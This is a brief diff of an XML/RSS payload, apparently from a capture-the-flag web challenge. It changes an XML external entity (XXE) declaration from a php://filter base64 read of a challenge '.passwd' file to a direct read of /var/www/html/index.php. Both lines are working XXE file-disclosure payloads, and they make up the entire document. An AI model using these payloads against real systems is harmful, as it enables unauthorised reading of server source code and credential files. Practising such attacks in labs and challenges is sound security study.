@@ -1,5 +1,5 @@
 <!DOCTYPE channel [
-  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/challenge/web-serveur/ch29/.passwd">
+  <!ENTITY xxe SYSTEM "/var/www/html/index.php">
 ]>
 <rss version="2.0">
   <channel>
